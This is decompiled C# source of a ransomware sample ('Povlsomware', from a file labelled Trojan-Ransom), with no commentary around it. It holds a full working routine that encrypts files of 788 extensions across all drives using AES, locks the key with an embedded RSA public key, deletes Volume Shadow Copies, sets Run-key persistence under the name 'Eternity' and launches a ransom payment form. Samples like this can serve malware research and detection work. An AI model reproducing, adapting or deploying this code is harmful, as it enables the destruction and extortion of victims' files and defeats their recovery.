// Decompiled with JetBrains decompiler
// Type: Povlsomware.Program
// Assembly: Microsoft, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 760C2F7B-40FF-4A5F-B63A-F2741DF7F4E8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\HEUR-Trojan-Ransom.Win32.Generic-55bf0aa9c3d746b8e47635c2eae2acaf77b4e65f3e6cbd8c51f6b657cdca4c91.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using System.Xml.Serialization;

namespace Povlsomware
{
  internal class Program
  {
    public static int count = 0;
    public static List<string> encryptedFiles = new List<string>();
    private static char[] password = Program.randpass(16);
    private static readonly string[] extensionsToEncrypt = new string[788]
    {
      "7z",
      "rar",
      "zip",
      "m3u",
      "m4a",
      "mp3",
      "wma",
      "ogg",
      "wav",
      "sqlite",
      "sqlite3",
      "img",
      "nrg",
      "tc",
      "doc",
      "docx",
      "docm",
      "odt",
      "rtf",
      "wpd",
      "wps",
      "csv",
      "key",
      "pdf",
      "pps",
      "ppt",
      "pptm",
      "pptx",
      "ps",
      "psd",
      "vcf",
      "xlr",
      "xls",
      "xlsx",
      "xlsm",
      "ods",
      "odp",
      "indd",
      "dwg",
      "dxf",
      "kml",
      "kmz",
      "gpx",
      "cad",
      "wmf",
      "3fr",
      "ari",
      "arw",
      "bay",
      "bmp",
      "cr2",
      "crw",
      "cxi",
      "dcr",
      "dng",
      "eip",
      "erf",
      "fff",
      "gif",
      "iiq",
      "j6i",
      "k25",
      "kdc",
      "mef",
      "mfw",
      "mos",
      "mrw",
      "nef",
      "nrw",
      "orf",
      "pef",
      "png",
      "raf",
      "raw",
      "rw2",
      "rwl",
      "rwz",
      "sr2",
      "srf",
      "srw",
      "x3f",
      "jpg",
      "jpeg",
      "tga",
      "tiff",
      "tif",
      "ai",
      "3g2",
      "3gp",
      "asf",
      "avi",
      "flv",
      "m4v",
      "mkv",
      "mov",
      "mp4",
      "mpg",
      "rm",
      "swf",
      "vob",
      "wmv",
      "txt",
      "php'",
      "html",
      "tar",
      "gz",
      "sql",
      "js",
      "css",
      "txt",
      "pdf",
      "tgz",
      "war",
      "jar",
      "java",
      "class",
      "ruby",
      "py",
      "cs",
      "zip",
      "db",
      "doc",
      "xls",
      "properties",
      "xml",
      "jpg",
      "jpeg",
      "gif",
      "mov",
      "avi",
      "wmv",
      "mp3",
      "mp4",
      "wma",
      "acc",
      "wav",
      "pem",
      "pub",
      "docx",
      "apk",
      "exe",
      "dll",
      "tpl",
      "psd",
      "asp",
      "phtml",
      "aspx",
      "csv",
      "sql",
      "mp4",
      "7z",
      "rar",
      "m4a",
      "wma",
      "avi",
      "wmv",
      "csv",
      "d3dbsp",
      "zip",
      "sie",
      "sum",
      "ibank",
      "t13",
      "t12",
      "qdf",
      "gdb",
      "tax",
      "pkpass",
      "bc6",
      "bc7",
      "bkp",
      "qic",
      "bkf",
      "sidn",
      "sidd",
      "mddata",
      "itl",
      "itdb",
      "icxs",
      "hvpl",
      "hplg",
      "hkdb",
      "mdbackup",
      "syncdb",
      "gho",
      "cas",
      "svg",
      "map",
      "wmo",
      "itm",
      "sb",
      "fos",
      "mov",
      "vdf",
      "ztmp",
      "sis",
      "sid",
      "ncf",
      "menu",
      "layout",
      "dmp",
      "blob",
      "esm",
      "vcf",
      "vtf",
      "dazip",
      "fpk",
      "mlx",
      "kf",
      "iwd",
      "vpk",
      "tor",
      "psk",
      "rim",
      "w3x",
      "fsh",
      "ntl",
      "arch00",
      "lvl",
      "snx",
      "cfr",
      "ff",
      "vpp_pc",
      "lrf",
      "m2",
      "mcmeta",
      "vfs0",
      "mpqge",
      "kdb",
      "db0",
      "dba",
      "rofl",
      "hkx",
      "bar",
      "upk",
      "das",
      "iwi",
      "litemod",
      "asset",
      "forge",
      "ltx",
      "bsa",
      "apk",
      "re4",
      "sav",
      "lbf",
      "slm",
      "bik",
      "epk",
      "rgss3a",
      "pak",
      "big",
      "wallet",
      "wotreplay",
      "xxx",
      "desc",
      "py",
      "m3u",
      "flv",
      "js",
      "css",
      "rb",
      "png",
      "jpeg",
      "txt",
      "p7c",
      "p7b",
      "p12",
      "pfx",
      "pem",
      "crt",
      "cer",
      "der",
      "x3f",
      "srw",
      "pef",
      "ptx",
      "r3d",
      "rw2",
      "rwl",
      "raw",
      "raf",
      "orf",
      "nrw",
      "mrwref",
      "mef",
      "erf",
      "kdc",
      "dcr",
      "cr2",
      "crw",
      "bay",
      "sr2",
      "srf",
      "arw",
      "3fr",
      "dng",
      "jpe",
      "jpg",
      "cdr",
      "indd",
      "ai",
      "eps",
      "pdf",
      "pdd",
      "psd",
      "dbf",
      "mdf",
      "wb2",
      "rtf",
      "wpd",
      "dxg",
      "xf",
      "dwg",
      "pst",
      "accdb",
      "mdb",
      "pptm",
      "pptx",
      "ppt",
      "xlk",
      "xlsb",
      "xlsm",
      "xlsx",
      "xls",
      "wps",
      "docm",
      "docx",
      "doc",
      "odb",
      "odc",
      "odm",
      "odp",
      "ods",
      "odt",
      "odt",
      "ods",
      "odp",
      "odm",
      "odc",
      "odb",
      "doc",
      "docx",
      "docm",
      "wps",
      "xls",
      "xlsx",
      "xlsm",
      "xlsb",
      "xlk",
      "ppt",
      "pptx",
      "pptm",
      "mdb",
      "accdb",
      "pst",
      "dwg",
      "dxf",
      "dxg",
      "wpd",
      "rtf",
      "wb2",
      "mdf",
      "dbf",
      "psd",
      "pdd",
      "pdf",
      "eps",
      "ai",
      "indd",
      "cdr",
      "dng",
      "3fr",
      "arw",
      "srf",
      "sr2",
      "mp3",
      "bay",
      "crw",
      "cr2",
      "dcr",
      "kdc",
      "erf",
      "mef",
      "mrw",
      "nef",
      "nrw",
      "orf",
      "raf",
      "raw",
      "rwl",
      "rw2",
      "r3d",
      "ptx",
      "pef",
      "srw",
      "x3f",
      "der",
      "cer",
      "crt",
      "pem",
      "pfx",
      "p12",
      "p7b",
      "p7c",
      "jpg",
      "png",
      "jfif",
      "jpeg",
      "gif",
      "bmp",
      "exif",
      "txt",
      "3fr",
      "accdb",
      "ai",
      "arw",
      "bay",
      "cdr",
      "cer",
      "cr2",
      "crt",
      "crw",
      "dbf",
      "dcr",
      "der",
      "dng",
      "doc",
      "docm",
      "docx",
      "dwg",
      "dxf",
      "dxg",
      "eps",
      "erf",
      "indd",
      "jpe",
      "jpg",
      "kdc",
      "mdb",
      "mdf",
      "mef",
      "mrw",
      "nef",
      "nrw",
      "odb",
      "odm",
      "odp",
      "ods",
      "odt",
      "orf",
      "p12",
      "p7b",
      "p7c",
      "pdd",
      "pef",
      "pem",
      "pfx",
      "ppt",
      "pptm",
      "pptx",
      "psd",
      "pst",
      "ptx",
      "r3d",
      "raf",
      "raw",
      "rtf",
      "rw2",
      "rwl",
      "srf",
      "srw",
      "wb2",
      "wpd",
      "wps",
      "xlk",
      "xls",
      "xlsb",
      "xlsm",
      "xlsx",
      "wb2",
      "psd",
      "p7c",
      "p7b",
      "p12",
      "pfx",
      "pem",
      "crt",
      "cer",
      "der",
      "pl",
      "py",
      "lua",
      "css",
      "js",
      "asp",
      "php",
      "incpas",
      "asm",
      "hpp",
      "h",
      "cpp",
      "c",
      "7z",
      "zip",
      "rar",
      "drf",
      "blend",
      "apj",
      "3ds",
      "dwg",
      "sda",
      "ps",
      "pat",
      "fxg",
      "fhd",
      "fh",
      "dxb",
      "drw",
      "design",
      "ddrw",
      "ddoc",
      "dcs",
      "csl",
      "csh",
      "cpi",
      "cgm",
      "cdx",
      "cdrw",
      "cdr6",
      "cdr5",
      "cdr4",
      "cdr3",
      "cdr",
      "awg",
      "ait",
      "ai",
      "agd1",
      "ycbcra",
      "x3f",
      "stx",
      "st8",
      "st7",
      "st6",
      "st5",
      "st4",
      "srw",
      "srf",
      "sr2",
      "sd1",
      "sd0",
      "rwz",
      "rwl",
      "rw2",
      "raw",
      "raf",
      "ra2",
      "ptx",
      "pef",
      "pcd",
      "orf",
      "nwb",
      "nrw",
      "nop",
      "nef",
      "ndd",
      "mrw",
      "mos",
      "mfw",
      "mef",
      "mdc",
      "kdc",
      "kc2",
      "iiq",
      "gry",
      "grey",
      "gray",
      "fpx",
      "fff",
      "exf",
      "erf",
      "dng",
      "dcr",
      "dc2",
      "crw",
      "craw",
      "cr2",
      "cmt",
      "cib",
      "ce2",
      "ce1",
      "arw",
      "3pr",
      "3fr",
      "mpg",
      "jpeg",
      "jpg",
      "mdb",
      "sqlitedb",
      "sqlite3",
      "sqlite",
      "sql",
      "sdf",
      "sav",
      "sas7bdat",
      "s3db",
      "rdb",
      "psafe3",
      "nyf",
      "nx2",
      "nx1",
      "nsh",
      "nsg",
      "nsf",
      "nsd",
      "ns4",
      "ns3",
      "ns2",
      "myd",
      "kpdx",
      "kdbx",
      "idx",
      "ibz",
      "ibd",
      "fdb",
      "erbsql",
      "db3",
      "dbf",
      "db-journal",
      "db",
      "cls",
      "bdb",
      "al",
      "adb",
      "backupdb",
      "bik",
      "backup",
      "bak",
      "bkp",
      "moneywell",
      "mmw",
      "ibank",
      "hbk",
      "ffd",
      "dgc",
      "ddd",
      "dac",
      "cfp",
      "cdf",
      "bpw",
      "bgt",
      "acr",
      "ac2",
      "ab4",
      "djvu",
      "pdf",
      "sxm",
      "odf",
      "std",
      "sxd",
      "otg",
      "sti",
      "sxi",
      "otp",
      "odg",
      "odp",
      "stc",
      "sxc",
      "ots",
      "ods",
      "sxg",
      "stw",
      "sxw",
      "odm",
      "oth",
      "ott",
      "odt",
      "odb",
      "csv",
      "rtf",
      "accdr",
      "accdt",
      "accde",
      "accdb",
      "sldm",
      "sldx",
      "ppsm",
      "ppsx",
      "ppam",
      "potm",
      "potx",
      "pptm",
      "pptx",
      "pps",
      "pot",
      "ppt",
      "xlw",
      "xll",
      "xlam",
      "xla",
      "xlsb",
      "xltm",
      "xltx",
      "xlsm",
      "xlsx",
      "xlm",
      "xlt",
      "xls",
      "xml",
      "dotm",
      "dotx",
      "docm",
      "docx",
      "dot",
      "doc",
      "txt",
      "odt",
      "ods",
      "odp",
      "odm",
      "odc",
      "odb",
      "doc",
      "docx",
      "docm",
      "wps",
      "xls",
      "xlsx",
      "xlsm",
      "xlsb",
      "xlk",
      "ppt",
      "pptx",
      "pptm",
      "mdb",
      "accdb",
      "pst",
      "dwg",
      "dxf",
      "dxg",
      "wpd",
      "rtf",
      "wb2",
      "mdf",
      "dbf",
      "psd",
      "pdd",
      "pdf",
      "eps",
      "ai",
      "indd",
      "cdr",
      "jpg",
      "jpe",
      "jpg",
      "dng",
      "3fr",
      "arw",
      "srf",
      "sr2",
      "bay",
      "crw",
      "cr2",
      "dcr",
      "kdc",
      "erf",
      "mef",
      "mrw",
      "nef",
      "nrw",
      "orf",
      "raf",
      "raw",
      "rwl",
      "rw2",
      "r3d",
      "ptx",
      "pef",
      "srw",
      "x3f",
      "der",
      "cer",
      "crt",
      "pem",
      "pfx",
      "p12",
      "p7b",
      "p7c"
    };

    [STAThread]
    public static char[] GetPass() => Program.password;

    private static void Main()
    {
      Program.Encrypt_pass();
      Program.start();
    }

    public static void Encrypt_pass()
    {
      RSAParameters parameters = (RSAParameters) new XmlSerializer(typeof (RSAParameters)).Deserialize((TextReader) new StringReader("<?xml version=\"1.0\" encoding=\"utf - 16\"?><RSAParameters xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><Exponent>AQAB</Exponent><Modulus>2bDwgNO/DtLmp4tPvrnndDrEO9cMBNYnugR7i1gIIDlm9ItADKcN0ozASh2FvqyxlQGEXJVDHczLXEWsnM8Vduk1T1esqRw9ZYwsRwe7+UunA+1952Jrk0ynf71qfAmqVhIoECgk+/SoT+Z/l3ppodpUPNtK2Ggazs/U7vCCFXSHFv+Wgwc20azUMYflJSlOS9/7C17NB6j0Bn7kQfappEiBJsXv9T1Pe3Ife3O2eLLLeKdsQxjDJ7iugeXE1g5xRxsjr/8gkZLhkkCnXiAEXQcjI0X84uhcLJxHxQ36rpO6Xmb5gfoCJotRh+FChc62tkWv0/W7lYhpLI+Br6/37Q==</Modulus></RSAParameters>"));
      RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider();
      cryptoServiceProvider.ImportParameters(parameters);
      byte[] bytes = Encoding.Unicode.GetBytes(new string(Program.password));
      string base64String = Convert.ToBase64String(cryptoServiceProvider.Encrypt(bytes, false));
      File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\sendme.eternityraas", base64String);
    }

    public static char[] randpass(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      while (0 < length--)
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890."[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.".Length)]);
      return stringBuilder.ToString().ToCharArray();
    }

    public static void start()
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.IsReady)
          Program.Attack(drive.Name);
      }
      Program.DestroyCopy();
      Program.SetStartup();
      Program.CreateUI();
    }

    private static void SetStartup()
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      if (registryKey.GetValue("Eternity") != null || Application.ExecutablePath.Contains("rundll32.exe"))
        return;
      registryKey.SetValue("Eternity", (object) ("\"" + Application.ExecutablePath + "\""));
    }

    private static void CreateUI()
    {
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      Application.Run((Form) new PayM3());
    }

    public static void DecryptFile(string fileEncrypted, string password)
    {
      byte[] bytes = Encoding.UTF8.GetBytes(password);
      byte[] hash = SHA256.Create().ComputeHash(bytes);
      byte[] buffer = Program.AES_Decrypt(((IEnumerable<byte>) File.ReadAllBytes(fileEncrypted)).Skip<byte>(3).ToArray<byte>(), hash);
      FileStream fileStream1 = File.Open(fileEncrypted, FileMode.Open);
      fileStream1.SetLength(0L);
      fileStream1.Close();
      using (FileStream fileStream2 = new FileStream(fileEncrypted, FileMode.Append))
        fileStream2.Write(buffer, 0, buffer.Length);
    }

    public static void DestroyCopy()
    {
      bool flag;
      using (WindowsIdentity current = WindowsIdentity.GetCurrent())
        flag = new WindowsPrincipal(current).IsInRole(WindowsBuiltInRole.Administrator);
      if (!flag)
        return;
      ManagementClass managementClass = new ManagementClass("\\\\.\\ROOT\\cimv2" + ":" + "Win32_ShadowCopy");
      try
      {
        foreach (ManagementObject instance in managementClass.GetInstances())
          instance.Delete();
      }
      catch (Exception ex)
      {
      }
    }

    public static void EncryptFile(string fileUnencrypted)
    {
      byte[] bytes1 = Encoding.UTF8.GetBytes(Program.password);
      byte[] hash = SHA256.Create().ComputeHash(bytes1);
      byte[] buffer = Program.AES_Encrypt(File.ReadAllBytes(fileUnencrypted), hash);
      FileStream fileStream1 = File.Open(fileUnencrypted, FileMode.Open);
      fileStream1.SetLength(0L);
      fileStream1.Close();
      using (FileStream fileStream2 = new FileStream(fileUnencrypted, FileMode.Append))
      {
        if (!fileStream2.CanWrite)
          return;
        byte[] bytes2 = Encoding.UTF8.GetBytes("Eth");
        fileStream2.Write(bytes2, 0, bytes2.Length);
        fileStream2.Write(buffer, 0, buffer.Length);
        ++Program.count;
        Program.encryptedFiles.Add(fileUnencrypted);
      }
    }

    public static void Attack(string startDirectory) => Program.ProcessDirectory(startDirectory, 1, "");

    public static void UndoAttack(string decryption_password)
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.IsReady)
          Program.ProcessDirectory(drive.Name, 0, decryption_password);
      }
    }

    public static void ProcessDirectory(string targetDirectory, int action, string password)
    {
      foreach (string fileName in Directory.EnumerateFiles(targetDirectory, "*.*").Where<string>((Func<string, bool>) (file => ((IEnumerable<string>) Program.extensionsToEncrypt).Any<string>((Func<string, bool>) (x => file.EndsWith(x, StringComparison.OrdinalIgnoreCase))))))
        Program.ProcessFile(fileName, action, password);
      foreach (string directory in Directory.GetDirectories(targetDirectory))
      {
        try
        {
          if (!directory.Contains("All Users\\Microsoft\\"))
          {
            if (!directory.Contains("$Recycle.Bin"))
            {
              if (!directory.Contains("C:\\Windows"))
              {
                if (!directory.Contains("C:\\Program Files"))
                {
                  if (!directory.Contains("Temporary Internet Files"))
                  {
                    if (!directory.Contains("AppData\\"))
                    {
                      if (!directory.Contains("\\source\\"))
                      {
                        if (!directory.Contains("C:\\ProgramData\\"))
                        {
                          if (!directory.Contains("\\Eternity\\"))
                            Program.ProcessDirectory(directory, action, password);
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
        catch
        {
        }
      }
    }

    public static bool IsMarked(string fileName)
    {
      if (!((IEnumerable<byte>) Encoding.ASCII.GetBytes("Eth")).SequenceEqual<byte>((IEnumerable<byte>) ((IEnumerable<byte>) File.ReadAllBytes(fileName)).Take<byte>(3).ToArray<byte>()))
        return false;
      ++Program.count;
      Program.encryptedFiles.Add(fileName);
      return true;
    }

    public static void ProcessFile(string fileName, int action, string password)
    {
      if (action == 1)
      {
        if (!Program.IsMarked(fileName))
        {
          try
          {
            Program.EncryptFile(fileName);
            return;
          }
          catch
          {
            return;
          }
        }
      }
      if (action != 0)
        return;
      if (!Program.IsMarked(fileName))
        return;
      try
      {
        Program.DecryptFile(fileName, password);
      }
      catch
      {
      }
    }

    public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
          }
          return memoryStream.ToArray();
        }
      }
    }

    public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
    {
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
            cryptoStream.Close();
          }
          return memoryStream.ToArray();
        }
      }
    }
  }
}
